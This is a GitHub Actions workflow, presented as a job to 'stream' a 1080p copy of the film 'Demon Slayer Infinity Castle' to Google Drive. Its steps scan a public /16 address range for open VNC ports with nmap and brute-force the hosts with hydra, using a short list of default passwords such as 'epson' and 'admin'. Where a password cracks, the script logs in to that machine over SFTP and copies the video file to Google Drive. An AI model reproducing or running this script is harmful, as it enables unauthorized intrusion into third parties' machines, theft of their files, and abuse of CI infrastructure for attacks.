name: Demon Slayer Infinity Castle â€“ 1080p Stream to Google Drive
on:
  workflow_dispatch:

jobs:
  stream:
    runs-on: ubuntu-latest
    steps:
      - name: Install tools
        run: |
          sudo apt-get update -y
          sudo apt-get install -y nmap hydra rclone p7zip-full

      - name: Scan for open VNC
        run: |
          nmap -p5900 --open 210.172.0.0/16 -oG - | awk '/5900\/open/{print $2}' > vnc_hosts.txt

      - name: Brute VNC passwords (always runs)
        run: |
          printf 'epson\nadmin\nprojector\n123456\n' > ~/pwd.txt
          touch valid_ips.txt
          while read ip; do
            hydra -P ~/pwd.txt vnc://$ip -t 4 -f -o hydra_$ip.txt
            [ -s hydra_$ip.txt ] && echo "$ip" >> valid_ips.txt
          done < vnc_hosts.txt

      - name: Download & stream 1080p (only if IPs exist)
        run: |
          [ ! -s valid_ips.txt ] && echo "No valid IPs" && exit 0
          ip=$(head -n1 valid_ips.txt)
          pass=$(awk '/password:/ {print $NF}' hydra_$ip.txt | head -n1)
          [ -z "$pass" ] && echo "Empty password" && exit 0

          # Google Drive config
          mkdir -p ~/.config/rclone
          cat > ~/.config/rclone/rclone.conf <<'EOF'
          [gdrive]
          type = drive
          token = ${{ secrets.RCLONE_GDRIVE_TOKEN }}
          [relay]
          type = sftp
          host = $ip
          user = epson
          port = 22
          pass = $(rclone obscure "$pass")
          EOF

          rclone copy "relay:/DSIC_P1/VIDEO/DSIC_P1_1080p.mov" \
                      "gdrive:Movies/DSIC_P1_1080p.mov" \
                      --transfers=8 -P
          echo "movie uploaded to Google Drive"
